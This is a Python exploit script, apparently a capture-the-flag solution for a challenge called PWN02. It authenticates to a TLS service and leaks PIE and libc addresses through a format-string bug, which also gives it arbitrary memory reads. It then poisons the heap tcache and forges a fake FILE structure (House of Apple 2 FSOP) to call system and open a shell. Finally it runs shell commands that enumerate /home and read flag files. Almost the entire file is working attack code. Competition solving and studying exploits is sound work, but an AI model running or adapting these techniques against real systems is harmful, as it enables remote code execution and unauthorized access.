#!/usr/bin/env python3
"""PWN02 remote solve: authenticated format-string leaks + heap FSOP.

Usage:
    python3 solve_shell.py pwn02-<instance>.59.153.245.188.sslip.io

The service prints an ``alt/legacy`` 16-byte value on the current remote
wrapper.  That value is the raw key material for the world-1 session key.
If a wrapper does not print it, pass the raw value with --legacy-key HEX.
"""

import argparse
import hashlib
import re
import select
import socket
import ssl
import struct
import sys
import time


MAGIC = struct.pack(
    "<QQ", (-0x4145013510415222) & ((1 << 64) - 1), 0x0807060504030201
)

SERVER_OFF_ITEMS = 0x70C0
SERVER_OFF_STDOUT = 0x5020
# The fifth stale variadic argument is a pointer to buf.0+1 (0x5041 in the
# extracted binary).  Keeping the relationship rather than the absolute BSS
# offset also handles the remote build's +0x40 layout shift.
SERVER_OFF_STDOUT_FROM_BUF1 = 0x21
SERVER_OFF_ITEMS_FROM_STDOUT = SERVER_OFF_ITEMS - SERVER_OFF_STDOUT
# The extracted local server uses 0x30a0 for the dispatch table.  The
# current remote build moves that table to 0x30e0; both values are retained
# and leak_pie selects the one that produces a page-aligned PIE base.
SERVER_OFF_FIRST_PRINTF_ARG_CANDIDATES = (0x30A0, 0x30E0)

LIBC_OFF_STDOUT = 0x21B780
LIBC_OFF_LIST_ALL = 0x21B680
LIBC_OFF_WFILE_JUMPS = 0x2170C0
LIBC_OFF_SYSTEM = 0x50D70


def sha256(data):
    return hashlib.sha256(data).digest()


def make_frame(key, seq, plain):
    encrypted = bytearray(plain)
    for off in range(0, len(encrypted), 32):
        stream = sha256(key + struct.pack("<IHH", seq, off // 32, 0))
        for i in range(min(32, len(encrypted) - off)):
            encrypted[off + i] ^= stream[i]
    mac = sha256(key + struct.pack("<I", seq) + encrypted)[:8]
    body = struct.pack("<I", seq) + bytes(encrypted) + mac
    return struct.pack("<I", len(body)) + body


class Remote:
    def __init__(self, host, port, legacy_key=None, timeout=5.0):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((host, port), timeout=timeout)
        self.sock = ctx.wrap_socket(raw, server_hostname=host)
        self.sock.settimeout(0.35)
        self.seq = 0

        self.sock.sendall(struct.pack("<I", 17) + b"\x01" + MAGIC)
        self.greeting = self.recv_quiet(total=3.0, quiet=0.5)
        print(self.greeting.decode("latin1", "replace"), end="", file=sys.stderr)

        pub = re.search(rb"The key is\s+([0-9a-f]{32})", self.greeting)
        if not pub:
            raise RuntimeError("did not receive the key greeting")
        public_key = bytes.fromhex(pub.group(1).decode())

        if legacy_key is None:
            alt = re.search(rb"alt/legacy:\s*([0-9a-f]{32})", self.greeting)
            if alt:
                legacy_key = bytes.fromhex(alt.group(1).decode())
        elif isinstance(legacy_key, str):
            legacy_key = bytes.fromhex(legacy_key)

        if legacy_key is None:
            raise RuntimeError(
                "no alt/legacy key was printed; rerun with --legacy-key <32 hex bytes>"
            )

        if len(legacy_key) != 16:
            raise ValueError("legacy key must be exactly 16 bytes")

        # world 1 is the privileged session used by free().  The displayed
        # key derives world 2 (the legacy/low session), so it is not enough
        # for the heap route.
        self.key = sha256(legacy_key + b"svattt")
        self.low_key = sha256(public_key + b"svattt")
        print(f"[+] world-1 session key: {self.key.hex()}", file=sys.stderr)

    def recv_quiet(self, total=1.0, quiet=0.12):
        data = bytearray()
        end = time.monotonic() + total
        while time.monotonic() < end:
            self.sock.settimeout(min(quiet, max(0.01, end - time.monotonic())))
            try:
                chunk = self.sock.recv(65536)
            except (socket.timeout, ssl.SSLError):
                if data:
                    break
                continue
            if not chunk:
                break
            data.extend(chunk)
        return bytes(data)

    def command(self, plain, wait=0.08):
        self.sock.sendall(make_frame(self.key, self.seq, plain))
        self.seq += 1
        return self.recv_quiet(total=wait, quiet=min(0.05, wait))

    def owner_set(self, data):
        # do_owner copies at most 255 bytes.  A 256-byte payload is useful:
        # the final automatic NUL supplies the canonical high byte of p64()
        # pointers while keeping the controlled pointer at offset 248.
        if len(data) > 256:
            raise ValueError("owner payload too long")
        self.command(b"\x10" + data)

    def owner_print(self):
        return self.command(b"\x10", wait=0.8)

    def add(self, size, data=b""):
        if len(data) > size:
            raise ValueError("add payload is larger than requested size")
        self.command(b"\x20" + struct.pack("<I", size) + data)

    def free(self, index):
        self.command(b"\x21" + struct.pack("<I", index))

    def leak_pie(self):
        self.owner_set(b"%p|%p|%p|%p|%p")
        out = self.owner_print()
        matches = re.findall(rb"0x([0-9a-fA-F]+)", out)
        if len(matches) < 5:
            raise RuntimeError(f"PIE/BSS leak failed: {out!r}")
        first = int(matches[0], 16)
        buf_plus_one = int(matches[4], 16)
        for table_offset in SERVER_OFF_FIRST_PRINTF_ARG_CANDIDATES:
            base = first - table_offset
            if base >= 0 and not (base & 0xfff):
                self.stdout_addr = buf_plus_one - SERVER_OFF_STDOUT_FROM_BUF1
                self.items_addr = self.stdout_addr + SERVER_OFF_ITEMS_FROM_STDOUT
                print(
                    f"[+] server base = {base:#x} (dispatch +{table_offset:#x})",
                    file=sys.stderr,
                )
                print(
                    f"[+] stdout/items globals = {self.stdout_addr:#x} / {self.items_addr:#x}",
                    file=sys.stderr,
                )
                return base
        raise RuntimeError(f"unexpected PIE leak {first:#x}")

    def read_mem(self, address, count=8):
        """Read bytes through the owner printf format string.

        In this call path the 76th printf argument is the qword at owner
        offset 248.  The first 75 %c conversions are deliberately consumed
        before the controlled %s, so only the final delimited region matters.
        """
        fmt = b"%c" * 75 + b"|%s|END"
        pointer_offset = 248
        payload = fmt + b"\0" + b"X" * (pointer_offset - len(fmt) - 1)
        payload += struct.pack("<Q", address)
        self.owner_set(payload)
        out = self.owner_print()
        end_marker = b"|END\n"
        end = out.rfind(end_marker)
        if end < 76:
            raise RuntimeError(f"arbitrary read failed at {address:#x}: {out!r}")
        raw = out[76:end]
        return raw[:count]

    def read_qword(self, address):
        raw = self.read_mem(address, 8)
        return struct.unpack("<Q", raw.ljust(8, b"\0")) [0]

    def heap_fsop(self, server_base, libc_base, items_addr=None):
        list_all = libc_base + LIBC_OFF_LIST_ALL
        wfile_jumps = libc_base + LIBC_OFF_WFILE_JUMPS
        system = libc_base + LIBC_OFF_SYSTEM

        if list_all & 0xf:
            raise RuntimeError("_IO_list_all is not aligned for tcache poisoning")

        # Leave one 0x1f0 tcache entry.  The seeded entry is essential: after
        # the poisoned B entry is popped, tcache still follows its forged next
        # pointer for the next allocation.
        self.add(0x1e8)                  # slot 0
        self.free(0)

        self.add(0x410)                  # slot 1: P
        self.add(0x410)                  # slot 2: W
        self.add(0x410)                  # slot 3: B
        items = items_addr if items_addr is not None else server_base + SERVER_OFF_ITEMS
        old_p = self.read_qword(items + 1 * 8)
        old_w = self.read_qword(items + 2 * 8)
        old_b = self.read_qword(items + 3 * 8)
        if not (old_p < old_w < old_b):
            raise RuntimeError(f"unexpected heap pointers: {old_p:#x}, {old_w:#x}, {old_b:#x}")
        w_off = old_w - old_p
        b_off = old_b - old_p
        print(f"[+] P/W/B = {old_p:#x} {old_w:#x} {old_b:#x}", file=sys.stderr)

        self.free(1)
        self.free(2)
        self.free(3)

        l = old_p
        payload = bytearray(0xb00)

        # House of Apple 2 fake FILE.  The command string is " sh"; system()
        # starts a shell whose stdin/stdout remain the challenge connection.
        struct.pack_into("<I", payload, 0x00, 0x00687320)
        struct.pack_into("<Q", payload, 0x20, 0)
        struct.pack_into("<Q", payload, 0x28, 1)
        struct.pack_into("<Q", payload, 0x88, l + 0x380)
        struct.pack_into("<Q", payload, 0xa0, l + 0x200)
        struct.pack_into("<Q", payload, 0xd8, wfile_jumps)
        struct.pack_into("<Q", payload, 0x200 + 0x18, 0)
        struct.pack_into("<Q", payload, 0x200 + 0x20, 0)
        struct.pack_into("<Q", payload, 0x200 + 0x30, 0)
        struct.pack_into("<Q", payload, 0x200 + 0xe0, l + 0x300)
        struct.pack_into("<Q", payload, 0x300 + 0x68, system)

        # Fake W is placed in the coalesced unsorted chunk and fake B in the
        # 0x1f0 tcache chunk.  The second in-use marker prevents consolidation
        # from rejecting the forged W boundary.
        struct.pack_into("<Q", payload, w_off - 0x10, 0)
        struct.pack_into("<Q", payload, w_off - 0x08, 0x501)
        next_w = w_off - 0x10 + 0x500
        struct.pack_into("<Q", payload, next_w + 0x08, 0x21)
        struct.pack_into("<Q", payload, next_w + 0x20 + 0x08, 1)
        struct.pack_into("<Q", payload, b_off - 0x10, 0)
        struct.pack_into("<Q", payload, b_off - 0x08, 0x1f1)
        struct.pack_into("<Q", payload, b_off + 0x1f0 - 0x08, 0x21)

        self.add(0xb00, payload)         # slot 4: L
        self.free(3)                     # B -> tcache
        self.free(2)                     # W -> unsorted

        writer = bytearray(0x4f8)
        encoded = list_all ^ (old_b >> 12)
        struct.pack_into("<Q", writer, b_off - w_off, encoded)
        self.add(0x4f8, writer)          # slot 5: W; overwrites B->next
        self.add(0x1e8)                  # slot 6: B; head becomes list_all
        self.add(0x1e8, struct.pack("<Q", l))  # slot 7: *list_all = L

        print(f"[+] poisoned _IO_list_all = {list_all:#x} -> {l:#x}", file=sys.stderr)

    def launch_shell(self):
        # Invalid outer length makes main return.  libc exit processing then
        # flushes _IO_list_all and invokes the fake wide-file vtable.
        self.sock.sendall(struct.pack("<I", 0xFFFFFFFF))
        time.sleep(0.35)

    def interactive_shell(self):
        """Relay the challenge socket and local terminal after FSOP."""
        self.sock.settimeout(None)
        stdin = sys.stdin.buffer
        stdout = sys.stdout.buffer
        while True:
            ready, _, _ = select.select([self.sock, stdin], [], [])
            if self.sock in ready:
                data = self.sock.recv(4096)
                if not data:
                    return
                stdout.write(data)
                stdout.flush()
            if stdin in ready:
                data = stdin.read1(4096)
                if not data:
                    return
                self.sock.sendall(data)

    def spawn_shell_and_read_flag(self):
        self.launch_shell()
        # Keep the probe self-contained: instances sometimes place the real
        # file under /home/ctf rather than directly under /home, and the
        # decoy `flag` file may coexist with it.
        command = (
            b"printf '__PWD__\\n'; pwd; "
            b"printf '__LS_HOME__\\n'; ls -la /home 2>&1; "
            b"for d in /home/* /home/.[!.]*; do [ -e \"$d\" ] || continue; "
            b"if [ -d \"$d\" ]; then printf '%s\\n' \"--- $d ---\"; ls -la \"$d\" 2>&1; fi; "
            b"done; printf '__HOME_TREE__\\n'; find -L /home -maxdepth 5 -print 2>&1; "
            b"printf '__FLAG_FILES__\\n'; "
            b"for f in $(find -L /home -maxdepth 5 -iname '*flag*' -print); do "
            b"[ -f \"$f\" ] || continue; "
            b"printf '%s\\n' \"--- $f ---\"; cat \"$f\" 2>&1; "
            b"done; printf '__PWN02_DONE__\\n'; id\n"
        )
        self.sock.sendall(command)
        out = self.recv_quiet(total=10.0, quiet=0.8)
        return out


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--legacy-key", help="raw 16-byte world-1 key, hex")
    parser.add_argument(
        "--interactive", action="store_true",
        help="leave the spawned /bin/sh interactive instead of probing files",
    )
    args = parser.parse_args()

    x = Remote(args.host, args.port, args.legacy_key)
    try:
        server_base = x.leak_pie()
        stdout_ptr = x.read_qword(x.stdout_addr)
        libc_base = stdout_ptr - LIBC_OFF_STDOUT
        if libc_base & 0xfff:
            raise RuntimeError(f"unexpected stdout/libc leak: {stdout_ptr:#x}")
        print(f"[+] libc base = {libc_base:#x}", file=sys.stderr)

        x.heap_fsop(server_base, libc_base, x.items_addr)
        if args.interactive:
            print("[+] shell launched; interactive relay active", file=sys.stderr)
            x.launch_shell()
            x.interactive_shell()
            return
        output = x.spawn_shell_and_read_flag()
        sys.stdout.buffer.write(output)
        sys.stdout.buffer.flush()
        # The remote instance uses the competition's SVATTT{} flag format;
        # local notes used CSCV2026{} as a placeholder.
        flags = re.findall(rb"(?:SVATTT|CSCV2026)\{[^}\r\n]*\}", output)
        flag = next((f for f in flags if f.startswith(b"CSCV2026{")), None)
        if flag is None and flags:
            flag = flags[0]
        if flag:
            print(f"\n[+] FLAG: {flag.decode()}", file=sys.stderr)
        else:
            print("\n[-] shell output did not contain a CSCV2026 flag", file=sys.stderr)
    finally:
        try:
            x.sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
